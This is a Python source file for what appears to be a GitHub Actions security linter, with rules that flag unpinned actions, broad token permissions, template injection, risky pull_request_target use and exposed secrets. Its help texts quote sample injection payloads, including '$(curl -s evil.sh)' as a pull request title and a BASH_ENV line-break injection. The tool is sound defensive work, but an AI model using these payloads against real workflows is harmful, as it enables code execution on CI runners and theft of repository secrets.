"""The checks. Each rule takes a parsed workflow and yields findings.

The rules follow GitHub's own "Security hardening for GitHub Actions" guidance; see the README
for the reasoning and links behind each one.
"""

from __future__ import annotations

import re
from collections.abc import Callable, Iterator
from dataclasses import dataclass

from yaml.nodes import MappingNode, Node, ScalarNode, SequenceNode

from .expressions import (
    ContextPath,
    Expression,
    ExpressionError,
    context_paths,
    find_expressions,
    matches,
)
from .model import Finding, Severity
from .taint import INPUT, OUTSIDER, TOJSON, Taint, Tracker
from .workflow import Workflow, get, key_node, scalar


@dataclass(frozen=True)
class Rule:
    id: str
    name: str
    summary: str
    check: Callable[[Workflow], Iterator[Finding]]
    help: str = ""
    """Why it matters and how to fix it; shown in code scanning (SARIF ``help``)."""


def _at(
    wf: Workflow, node: Node, rule_id: str, severity: Severity, message: str, line_offset: int = 0
) -> Finding:
    mark = node.start_mark
    return Finding(wf.path, mark.line + 1 + line_offset, mark.column + 1, rule_id, severity, message)


# --- WG001 unpinned actions -------------------------------------------------------------------

_SHA = re.compile(r"^[0-9a-f]{40}$")
# Actions maintained by GitHub itself. A moved tag there is far less likely than in a
# third-party action, so it's reported, but as low.
_FIRST_PARTY = ("actions/", "github/")


def unpinned_actions(wf: Workflow) -> Iterator[Finding]:
    for uses in wf.uses_nodes():
        yield from _check_uses(wf, uses)


def _check_uses(wf: Workflow, node: Node) -> Iterator[Finding]:
    ref = scalar(node)
    if not ref or ref.startswith("./"):
        return  # local actions live in this repository
    if ref.startswith("docker://"):
        if "@sha256:" not in ref:
            yield _at(
                wf,
                node,
                "WG001",
                Severity.MEDIUM,
                f"'{ref}' uses a Docker tag that can change; pin it with @sha256:<digest>",
            )
        return
    name, _, version = ref.partition("@")
    if not version:
        yield _at(wf, node, "WG001", Severity.HIGH, f"'{ref}' has no version at all; pin it to a commit SHA")
    elif not _SHA.match(version):
        severity = Severity.LOW if name.startswith(_FIRST_PARTY) else Severity.HIGH
        yield _at(
            wf,
            node,
            "WG001",
            severity,
            f"'{ref}' points to a tag or branch that can be moved; pin it to a full commit SHA",
        )


# --- WG002 / WG003 permissions --------------------------------------------------------------


def missing_permissions(wf: Workflow) -> Iterator[Finding]:
    if get(wf.root, "permissions") is not None:
        return
    without = [job_id for job_id, job in wf.jobs() if get(job, "permissions") is None]
    if without:
        node = key_node(wf.root, "jobs") or wf.root
        yield _at(
            wf,
            node,
            "WG002",
            Severity.MEDIUM,
            "no 'permissions:' at the top or in job(s) "
            + ", ".join(without)
            + "; the GITHUB_TOKEN gets the repository default, which may allow writes."
            " Add e.g. 'permissions: contents: read'",
        )


def write_all(wf: Workflow) -> Iterator[Finding]:
    candidates: list[tuple[str, Node | None]] = [("workflow", get(wf.root, "permissions"))]
    candidates += [(f"job '{job_id}'", get(job, "permissions")) for job_id, job in wf.jobs()]
    for where, node in candidates:
        if scalar(node) == "write-all":
            yield _at(
                wf, node, "WG003", Severity.HIGH, f"{where} grants 'write-all'; list only the scopes it needs"
            )


# --- WG004 template injection ---------------------------------------------------------------

_ADVICE = "pass it through 'env:' and use the variable instead"


def _injection_message(path: ContextPath, taint: Taint) -> str:
    """Direct uses keep their short message; a detour through env/outputs is spelled out."""
    if not taint.via:
        if taint.kind == TOJSON:
            return (
                f"toJSON({taint.source}) includes values outsiders can set, such as '{taint.example}',"
                f" and is pasted into a script; {_ADVICE}"
            )
        if taint.kind == INPUT:
            return (
                f"'{taint.source}' comes from the calling workflow, which may pass untrusted"
                f" text, and is pasted into a script; {_ADVICE}"
            )
        return f"'{taint.source}' can be set by outsiders and is pasted into a script; {_ADVICE}"

    origin = _origin(taint)
    if path.segments[0] == "env":
        # The variable is already in the environment: the shell can read it without pasting.
        name = taint.via[-1].split(" ", 1)[0].removeprefix("env.").removeprefix("$")
        advice = f'use the shell variable "${name}" instead'
    else:
        advice = _ADVICE
    return f"'{path}' carries {origin} (via {' -> '.join(taint.via)}) and is pasted into a script; {advice}"


def template_injection(wf: Workflow) -> Iterator[Finding]:
    tracker = Tracker(wf)
    for tracked in tracker.steps():
        step = tracked.step
        targets = [get(step.node, "run")]
        if (step.uses or "").startswith("actions/github-script@"):
            targets.append(get(get(step.node, "with"), "script"))
        for node in targets:
            if not isinstance(node, ScalarNode):
                continue
            for expr in find_expressions(node.value):
                hit = tracker.taint_of_expression(expr, tracked.scope)
                if hit is None:
                    continue
                offset = node.value.count("\n", 0, expr.start)
                if node.style in ("|", ">"):
                    offset += 1  # the text starts on the line after "run: |"
                path, taint = hit
                yield _at(
                    wf, node, "WG004", taint.severity, _injection_message(path, taint), line_offset=offset
                )


# --- WG007 untrusted text in $GITHUB_ENV / $GITHUB_PATH ----------------------------------------


def _origin(taint: Taint) -> str:
    return {
        OUTSIDER: f"'{taint.source}', which outsiders can set",
        TOJSON: f"toJSON({taint.source}), which includes values outsiders can set",
        INPUT: f"'{taint.source}' from the calling workflow, which may be untrusted",
    }[taint.kind]


_FILE_EFFECT = {
    "ENV": (
        "$GITHUB_ENV",
        "a line break in it can set any variable for the later steps (BASH_ENV, LD_PRELOAD,"
        " NODE_OPTIONS...), which runs code of the sender's choosing",
    ),
    "PATH": (
        "$GITHUB_PATH",
        "it can put a directory of the sender's choosing first in PATH for the later steps",
    ),
}


def untrusted_github_env(wf: Workflow) -> Iterator[Finding]:
    for tracked in Tracker(wf).steps():
        for write in tracked.writes:
            if write.key == "run":
                node = get(tracked.step.node, "run")
            else:
                node = get(get(tracked.step.node, "with"), "script")
            if not isinstance(node, ScalarNode):
                continue
            target, effect = _FILE_EFFECT[write.file]
            via = f" (via {' -> '.join(write.taint.via)})" if write.taint.via else ""
            offset = write.line + (1 if node.style in ("|", ">") else 0)
            yield _at(
                wf,
                node,
                "WG007",
                write.taint.severity,
                f"{_origin(write.taint)}{via} is written to {target}; {effect}."
                " Keep it in a step output or a file instead",
                line_offset=offset,
            )


# --- WG008 secrets exposure --------------------------------------------------------------------


def _scalars(node: Node | None) -> Iterator[ScalarNode]:
    """Every scalar value under ``node`` (mapping keys excluded)."""
    if isinstance(node, ScalarNode):
        yield node
    elif isinstance(node, MappingNode):
        for _key, value in node.value:
            yield from _scalars(value)
    elif isinstance(node, SequenceNode):
        for item in node.value:
            yield from _scalars(item)


def _expression_offset(node: ScalarNode, start: int) -> int:
    offset = node.value.count("\n", 0, start)
    return offset + 1 if node.style in ("|", ">") else offset


def _is_all_secrets(path: ContextPath) -> bool:
    return path.segments == ("secrets",) and path.function == "tojson"


def secrets_exposure(wf: Workflow) -> Iterator[Finding]:
    # toJSON(secrets): every secret of the repository in one value, wherever it is used.
    for node in _scalars(wf.root):
        for expr in find_expressions(node.value):
            if any(_is_all_secrets(path) for path in _paths(expr)):
                yield _at(
                    wf,
                    node,
                    "WG008",
                    Severity.HIGH,
                    "toJSON(secrets) puts every secret of the repository into one value; a single"
                    " log line, artifact or compromised step then leaks all of them. Pass only the"
                    " secrets this step needs, one by one",
                    line_offset=_expression_offset(node, expr.start),
                )

    # ${{ secrets.X }} pasted into a script.
    for step in wf.steps():
        targets = [get(step.node, "run")]
        if (step.uses or "").startswith("actions/github-script@"):
            targets.append(get(get(step.node, "with"), "script"))
        for node in targets:
            if not isinstance(node, ScalarNode):
                continue
            for expr in find_expressions(node.value):
                path = next(
                    (p for p in _paths(expr) if p.segments[0] == "secrets" and not _is_all_secrets(p)),
                    None,
                )
                if path is None:
                    continue
                name = str(path) if len(path.segments) > 1 else "secrets[...]"
                yield _at(
                    wf,
                    node,
                    "WG008",
                    Severity.MEDIUM,
                    f"'{name}' is pasted into the script text: quotes or '$' in the secret break the"
                    " script, and 'set -x', an error message or a process listing can show it."
                    f" Pass it through 'env:' and use the variable instead",
                    line_offset=_expression_offset(node, expr.start),
                )

    # secrets: inherit to a reusable workflow in another repository.
    for job_id, job in wf.jobs():
        uses = scalar(get(job, "uses")) or ""
        if not uses or uses.startswith("./") or scalar(get(job, "secrets")) != "inherit":
            continue
        yield _at(
            wf,
            get(job, "secrets") or job,
            "WG008",
            Severity.MEDIUM,
            f"job '{job_id}' passes all of this repository's secrets ('secrets: inherit') to"
            f" '{uses}', a workflow in another repository; list the secrets it needs instead",
        )


def _paths(expr: Expression) -> list[ContextPath]:
    try:
        return context_paths(expr.inner)
    except ExpressionError:
        return []  # GitHub rejects the workflow before anything runs


# --- WG005 pull_request_target ---------------------------------------------------------------

_PR_HEAD = (
    ("github", "event", "pull_request", "head", "sha"),
    ("github", "event", "pull_request", "head", "ref"),
    ("github", "head_ref"),
)


def _checks_out_pr_code(ref: str) -> bool:
    """``ref:`` of actions/checkout naming the pull request's code: its head, by expression,
    or GitHub's ``refs/pull/<n>/head`` / ``merge`` refs."""
    if "refs/pull/" in ref:
        return True
    return any(
        matches(path.segments, pattern)
        for expr in find_expressions(ref)
        for path in _paths(expr)
        for pattern in _PR_HEAD
    )


def pull_request_target(wf: Workflow) -> Iterator[Finding]:
    if "pull_request_target" not in wf.triggers():
        return
    risky = False
    for step in wf.steps():
        if (step.uses or "").startswith("actions/checkout@"):
            if _checks_out_pr_code(step.with_value("ref") or ""):
                risky = True
                yield _at(
                    wf,
                    step.node,
                    "WG005",
                    Severity.HIGH,
                    "checks out the pull request's code under 'pull_request_target', which runs"
                    " with secrets and a write token; a fork's PR can then run its own code",
                )
    if not risky:
        node = key_node(wf.root, "on") or wf.root
        yield _at(
            wf,
            node,
            "WG005",
            Severity.LOW,
            "'pull_request_target' runs with secrets for pull requests from forks;"
            " make sure no step runs code from the pull request",
        )


# --- WG006 persisted credentials -------------------------------------------------------------


def persisted_credentials(wf: Workflow) -> Iterator[Finding]:
    for step in wf.steps():
        if not (step.uses or "").startswith("actions/checkout@"):
            continue
        if (step.with_value("persist-credentials") or "").lower() != "false":
            yield _at(
                wf,
                get(step.node, "uses") or step.node,
                "WG006",
                Severity.LOW,
                "actions/checkout leaves the token in .git/config for later steps;"
                " set 'persist-credentials: false' unless a step pushes",
            )


RULES: tuple[Rule, ...] = (
    Rule(
        "WG001",
        "unpinned-action",
        "Actions and reusable workflows not pinned to a commit SHA",
        unpinned_actions,
        help=(
            "A tag or branch such as @v4 can be moved to different code after you've reviewed it; a "
            "full 40-character commit SHA can't. Pin with uses: owner/repo@<sha>  # v4 (workflow-"
            "guard --fix does this)."
        ),
    ),
    Rule(
        "WG002",
        "missing-permissions",
        "No explicit GITHUB_TOKEN permissions",
        missing_permissions,
        help=(
            "Without permissions: the GITHUB_TOKEN gets the repository's default, which may be "
            "read/write for everything. Add permissions: contents: read at the top and widen it per "
            "job only where needed."
        ),
    ),
    Rule(
        "WG003",
        "write-all",
        "'permissions: write-all'",
        write_all,
        help=(
            "write-all gives every step a token that can push code, create releases and change "
            "issues. List only the scopes the job needs."
        ),
    ),
    Rule(
        "WG004",
        "template-injection",
        "Untrusted ${{ }} values (or inputs from unknown callers) inside run: or github-script",
        template_injection,
        help=(
            "${{ }} values are pasted into the script before it runs, so a pull request title like "
            '$(curl -s evil.sh) runs as code. Pass the value through env: and use "$VAR" in the '
            "script instead. In a composite action or reusable workflow the same goes for "
            "${{ inputs.* }}: the calling workflow may pass untrusted text."
        ),
    ),
    Rule(
        "WG005",
        "pull-request-target",
        "pull_request_target, especially with a checkout of the PR",
        pull_request_target,
        help=(
            "pull_request_target runs with secrets and a write token even for pull requests from "
            "forks. Never check out and run the pull request's code in it; use pull_request instead "
            "where possible."
        ),
    ),
    Rule(
        "WG006",
        "persisted-credentials",
        "actions/checkout without persist-credentials: false",
        persisted_credentials,
        help=(
            "actions/checkout stores the token in .git/config, where every later step (and anything "
            "it downloads) can read it. Set persist-credentials: false unless a step pushes."
        ),
    ),
    Rule(
        "WG007",
        "untrusted-github-env",
        "Untrusted text written to $GITHUB_ENV or $GITHUB_PATH",
        untrusted_github_env,
        help=(
            "Every later step of the job reads $GITHUB_ENV and $GITHUB_PATH. A pull request title "
            "with a line break such as 'x\\nBASH_ENV=/tmp/evil.sh' then sets a variable that makes "
            "bash run the sender's script; $GITHUB_PATH can put their directory first in PATH. "
            "Pass the value to the step that needs it through env: or a step output instead."
        ),
    ),
    Rule(
        "WG008",
        "secrets-exposure",
        "Secrets pasted into scripts, toJSON(secrets), or 'secrets: inherit' to another repository",
        secrets_exposure,
        help=(
            "${{ secrets.X }} inside run: becomes part of the script text, where quotes break it and "
            'logs or process listings can show it; pass it through env: and use "$X". '
            "toJSON(secrets) and 'secrets: inherit' to a reusable workflow in another repository "
            "hand out every secret at once; pass only the ones needed."
        ),
    ),
)
RULE_IDS = frozenset(r.id for r in RULES)


def check(wf: Workflow, ignore: frozenset[str] = frozenset()) -> list[Finding]:
    """All findings for one workflow, minus ignored rules and inline ``ignore[...]`` comments."""
    found: list[Finding] = []
    for rule in RULES:
        if rule.id in ignore:
            continue
        for finding in rule.check(wf):
            if not wf.is_ignored(finding.line, finding.rule_id):
                found.append(finding)
    return sorted(found)
